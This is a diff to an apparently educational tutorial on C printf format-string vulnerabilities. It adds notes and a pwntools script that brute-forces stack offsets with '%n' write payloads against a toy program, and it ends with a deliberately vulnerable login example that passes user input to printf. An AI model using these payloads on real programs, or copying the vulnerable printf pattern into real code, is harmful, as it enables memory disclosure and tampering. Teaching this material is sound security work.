@@ -19,6 +19,7 @@ In certain circumstances, the C language's workhorse console display function, `
 * [printf vulnerable usage](#printf-vulnerable-usage)
 * [Reading through the stack](#reading-through-the-stack)
 * [Writing to memory](#writing-to-memory)
+* [A final example](#a-final-example)
 
 ### printf normal usage
 `printf` is a function included in the `stdio.h` header for displaying text on the console. It can display various combinations of a string literal, specified in the first argument to `printf`, and variables, specified in subsequent arguments. To specify where the variables should be displayed within the string literal, we use **format specifiers**. These start with a `%`, and are followed by a letter denoting the type we are expecting (e.g. `d` for signed decimal integer, and `s` for string).
@@ -241,7 +242,9 @@ $ ./no-args-x
 ```
 Now we can start to see what we're looking at. The first byte of offset 12, and all of offsets 13, 14 and 15 contain 12 ASCII values for the letter 'A' (`0x41`). Offset 16 has the value 3 in it, 17 has 2, and 18 has 1. These are the variables from our code! Our `s`, `a`, `b` and `c`. These are values off the stack! 
 
-If we don't specify arguments for our `printf` format string, `printf` will take values from the current stack pointer, and continue down the stack to satisfy subsequent requests.
+If we don't specify arguments for our `printf` format string, `printf` will take values from an offset from the current stack pointer, and continue down the stack to satisfy subsequent requests.
+
+> **Note**: The stack pointer is currently inside the `printf` stack frame when this starts to show values, and the offset is based on where `printf` expects to find the arguments. This is near the end of the `printf` stack frame, so leaks into the our program's stack frame, which is in the state it was before we called `printf`. This is important in our final example, but not generally necessary to know to exploit `printf`.
 
 As a side note, I built this executable as 32-bit so it shows things a bit more clearly than a 64-bit executable. Below is the output from a 32-bit and 64-bit executables showing hexadecimal integers (`%x`) and pointers (`%p`) to clarify. It shows the relevant offsets only, which have shifted from above with the addition of more local variables to handle the %p output, and also the change between the 64-bit and 32-bit executables:
 
@@ -421,6 +424,7 @@ print(f"String is: {str_response}")
 # Just close the process
 p.close()
 ```
+> *Note*: In general, C and C++ programs buffer output, only dumping the buffer contents to the console when the buffer is full, or when the program is idle (e.g. waiting for input). This is more efficient than writing it in bits and pieces. However, I've found this sometimes causes `recvline()` and `recvuntil()` to hang for some reason. To combat this, I have wrapped the call to the program in the Linux command `stdbuf` which lets you control output (*stdout*, *stderr*) and input (*stdin*) buffering. In CTF code you can often see `setvbuf()` used in the C/C++ code to do the same thing.
 
 When run, this outputs:
 ```
@@ -489,11 +493,11 @@ for i in range(1, 20):
         p.sendline(f"%{i}$s")
         response = p.recvline().strip().decode("utf-8")
         print(f"Position {i}: {response}")
-        p.close()
     except:
         # It may not be a segmentation fault, but it doesn't
         # really matter - it crashed!
         print(f"Position {i}: Segmentation error!")
+    finally:
         p.close()
 
 print('Done!')
@@ -600,9 +604,9 @@ What's the password? > Passw0rd
 You're in!
 ```
 
-> *Note*: I haven't included the Python code for `dump-stack-pass.py` and `dump-strings-heap.py` as they are similar to the previous Python code, just with the executable name changed and some changes the `recv*()` function order.
+> *Note*: I haven't included the Python code for `dump-stack-pass.py` and `dump-strings-heap.py` as they are similar to the previous Python code, just with the executable name changed and some changes to the `recv*()` function order.
 
-So now we can dump the stack, and also find out roughly where the stack and heap are in memory by looking at where pointers for strings point to.
+So now we can dump the stack, and also find out roughly where the stack and heap are in memory by looking at where pointers point to.
 
 So what if there's a long string on the stack with no pointer that would take a long time to decode from hex to ASCII? What if we need to change the value of a variable? How can we write to memory, not just read it?
 
@@ -634,9 +638,9 @@ int main(void)
   printf(user_input);
 }
 ```
-> *Note*: We are going to build this as 32-bit so we can deal with shorter addresses (the exploit is identical for 64-bit executables, but simpler to show in 32-bit). Because of this, using `stdbuf` to control the buffers in our Python script as it won't work (it's the wrong type of ELF!). Therefore, for this example, I've turned buffering off in the C code using `setvbuf`.
+> *Note*: We are going to build this as 32-bit so we can deal with shorter addresses (the exploit is identical for 64-bit executables, but simpler to show in 32-bit). Because of this, using `stdbuf` to control the buffers won't work (without some effort to get a 32-bit version on my 64-bit Ubuntu). It's the wrong type of ELF! Therefore, for this example, I've turned buffering off in the C code using `setvbuf` instead.
 
-This code gives us a string we need to print out. This could be a very long string that would be difficult to convert all the hex bytes to ASCII, so we'd really like to use our `%s` export to do it. But there's no pointer to this string on the stack. How can we access it?
+This code gives us a string we need to print out. This could be a very long string that would be difficult to convert all the hex bytes to ASCII, so we'd really like to use our `%s` format specifier to do it. But there's no pointer to this string on the stack. How can we access it?
 
 We can start by entering some data, and then see where that appears in the stack. We'll send 8 `A`s (hex `0x41`) to the program and see if we can spot them on the stack, using a series of `%p` format specifiers:
 ```
@@ -646,7 +650,7 @@ I'll tell you where the string is! You still won't print it out - 0xffc93726
 Come on! Hack me! > AAAAAAAA %p %p %p %p %p %p %p %p %p %p
 Is that really going to work? - AAAAAAAA 0x28 0xf7f02580 0x565f81c5 (nil) (nil) 0xfffffa60 0x41410009 0x41414141 0x25204141 0x70252070
 ```
-We can see that our `A`s start at position 7 (counting from `0x28` as 1) with 2 bytes having `0x41` in them, the 4 bytes of `0x41` in position 8, then the final 2 bytes in position 9 (followed by some `<space>%p` seen as hex `0x20 0x25 0x70`).
+We can see that our `A`s start at position 7 (counting from `0x28` as 1) with 2 bytes having `0x41` in them, then they appear in the 4 bytes of position 8, then the final 2 bytes in position 9 (followed by some `<space>%p` seen as hex `0x20 0x25 0x70`).
 
 We can confirm those positions with:
 ```
@@ -666,8 +670,8 @@ Is that really going to work? - AABBBBCC 0x41410009 0x42424242 0x25204343
 Yes we can! So if we can send 2 `A`s, followed by the address we want (`0xffbc85e6` on this run), we can create a pointer to the string in position 8, and print out the string using `%8$s`!
 
 Our payload for the above example, therefore, would be something like `AAffbc86e6%8$s`, which we would send as our input string, but note 2 things:
-* The address has to be written reversing the bytes as we're doing this on a little-endian machine, so should be `0xe685bcff`
-* The values for the address are the ASCII characters for each value in the address, but have to be the binary bytes themselves
+* The address has to be written with the bytes reversed as we're doing this on a little-endian machine, so should be sent as `0xe685bcff`
+* The values for the address in the example payload above are the ASCII characters for each value in the address, but have to be the binary bytes themselves for the exploit
 
 The second point means we can't type these in ourselves (as we can't type binary in directly), so we need to use something else instead.
 
@@ -855,6 +859,9 @@ context.log_level = 'critical'
 # buffering input/output so recv*() functions
 # work properly
 p = process(["stdbuf", "-i0", "-o0", "-e0", "./sum-up"])
+
+# Get the line with the pointer address in it, and
+# strip out the pointer we're looking for
 addr_line = p.recvline()
 addr_v = re.search('0x[0-9a-f]+', str(addr_line)).group(0)
 print(f"Looking for addr: {addr_v}")
@@ -910,4 +917,164 @@ Wow! You did convince me! 1 + 1 = 3!
 You deserve the secret word: Snoogle!
 Done!
 ```
-Finally, let's do away with any finesse and brute force the code. This is similar to what we did when finding any strings on the stack.
+OK, but let's do away with any finesse and brute force the code. This is similar to what we did when finding any strings on the stack, but we'll monitor the output so we know when we've broken out of the loop.
+
+The C code is updated to remove the print out of the pointer so we have no clues what we're looking for:
+```diff
+$diff sum-up.c sum-up2.c 
+10d9
+<   printf("Sum is: %p\n", sum);
+```
+
+We compiled and run it with:
+```
+$ gcc sum-up2.c -o sum-up2
+I believe 1 + 1 = 2! Convince me otherwise! > 1+1=6
+Do you think you can convince me with: 1+1=6
+I believe 1 + 1 = 2! Convince me otherwise! > %11$p
+Do you think you can convince me with: 0x556a1669a2a0
+I believe 1 + 1 = 2! Convince me otherwise! > AAA%11$n
+Do you think you can convince me with: AAA
+
+Wow! You did convince me! 1 + 1 = 3!
+You deserve the secret word: Snoogle!
+```
+> *Note*: We're only deleting a `printf()` line, so this won't change the stack order. We could just use the same exploit as earlier (as you can see), but we're going to pretend we don't know that!
+
+Let's write some Python code to exploit this by testing every offset:
+```python
+from pwn import *
+
+# Stop all the output about starting and stopping
+# the process
+context.log_level = 'critical'
+
+for i in range(1, 20):
+
+    # Catch crashes as we don't always get subsequent recv*()
+    # results
+    try:
+        # Open the executable with stdbuf to stop it
+        # buffering input/output so recv*() functions
+        # work properly
+        p = process(["stdbuf", "-i0", "-o0", "-e0", "./sum-up2"])
+
+        # Get the prompt
+        p.recvuntil(b"> ")
+
+        # Send the test exploit
+        exp_str = f"AAA%{i}$n".encode()
+        p.sendline(exp_str)
+
+        # Check what we get back
+        # Grab all the output - this can crash the program
+        # if we haven't exploited it
+        # We don't need the first couple of values returned,
+        # just the third!
+        p.recv()
+        p.recv()
+        response = p.recv().strip().decode("utf-8")
+        if response.startswith('Wow!'):
+            print(f"Exploit worked at position {i}")
+            secret_word = p.recv().strip().decode("utf-8").split(": ")[1]
+            print(f"The secret word found: {secret_word}")
+            break
+    except:
+        print(f"Position {i}: Segmentation error!")
+    finally:
+        p.close()
+```
+When we run this exploit we get:
+```
+$ python3 exploit-sum-up2.py 
+Position 2: Segmentation error!
+Position 3: Segmentation error!
+Position 5: Segmentation error!
+Position 6: Segmentation error!
+Position 7: Segmentation error!
+Position 8: Segmentation error!
+Position 9: Segmentation error!
+Exploit worked at position 11
+The secret word found: Snoogle!
+```
+Success!
+
+### A final example
+
+For a final example, lets pull everything together.
+
+You have an executable built from the following code:
+```c
+#include <stdio.h>
+#include <string.h>
+#include <time.h>
+#include <stdlib.h>
+
+#ifndef TRUE
+#  define TRUE  1
+#  define FALSE 0
+   typedef unsigned char BOOL;
+#endif
+
+#define EMAIL_MAX_LEN  50 
+#define PASSCODE_LEN   20
+
+// A function to get the user's login and password
+BOOL get_code(char *email)
+{
+  char secret_code[PASSCODE_LEN];
+  char entered_code[PASSCODE_LEN];
+  char q[] = "quit";
+
+  // Fill secret_code with random printable characters
+  srand(time(NULL));
+  for (unsigned int i = 0; i < PASSCODE_LEN-1; ++i)
+    secret_code[i] = (rand() % 90) + 32;
+  secret_code[PASSCODE_LEN-1] = '\0';
+
+  // Just pretend we send the secret code! ;)
+  printf("Welcome!\nWe have sent a secret code to your email!\n");
+  printf(email);
+
+  BOOL logged_in = FALSE;
+  printf("\nPlease enter the code you were sent > ");
+  while(!logged_in)
+  {
+    fgets(entered_code, PASSCODE_LEN, stdin);
+    
+    // Strip the newline from the input
+    entered_code[strcspn(entered_code, "\n")] = '\0';
+
+    if (strcmp(q, entered_code) == 0)
+      break;
+
+    if (strcmp(secret_code, entered_code) == 0)
+      logged_in = TRUE;
+    else
+    {
+      printf("The code you entered:\n  ");
+      printf(entered_code);
+      printf("\nis invalid. Try again, or enter 'quit' to cancel > ");
+    }
+  }
+
+  return logged_in;
+}
+
+// Entry point
+int main()
+{
+  char email[EMAIL_MAX_LEN];
+
+  printf("Please enter your email address > ");
+  fgets(email, EMAIL_MAX_LEN, stdin);
+  BOOL res = get_code(email);
+  if (res)
+    // Pretend this secret is something more exciting,
+    // and not hard coded!
+    printf("Account confirmed. Your secret is: Parsnips!\n");
+  else
+    printf("Login failed. Please go away!\n");
+  return 0;
+}
+```
